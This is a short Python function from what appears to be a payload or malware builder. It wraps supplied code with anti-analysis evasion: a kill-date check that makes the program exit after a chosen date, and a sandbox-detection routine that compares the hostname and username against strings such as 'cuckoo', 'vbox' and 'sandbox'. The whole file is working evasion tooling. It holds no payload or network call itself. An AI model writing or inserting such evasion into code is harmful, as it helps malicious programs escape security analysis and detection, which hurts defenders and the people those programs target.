def add_evasion_features(code: str, kill_date: str = "") -> str:
    evasion_code = []

    if kill_date:
        evasion_code.append(f"""
import datetime
if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
    import sys
    sys.exit(0)
""")

    evasion_code.append("""
def check_environment():
    import os, socket
    suspicious_indicators = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser']
    }
    try:
        hostname = socket.gethostname().lower()
        if any(h in hostname for h in suspicious_indicators['hostnames']):
            return False
    except: pass
    try:
        username = os.getenv("USER", "").lower()
        if any(u in username for u in suspicious_indicators['users']):
            return False
    except: pass
    return True

#if not check_environment():
#   import sys; sys.exit(0)
""")
    return '\n'.join(evasion_code) + '\n' + code
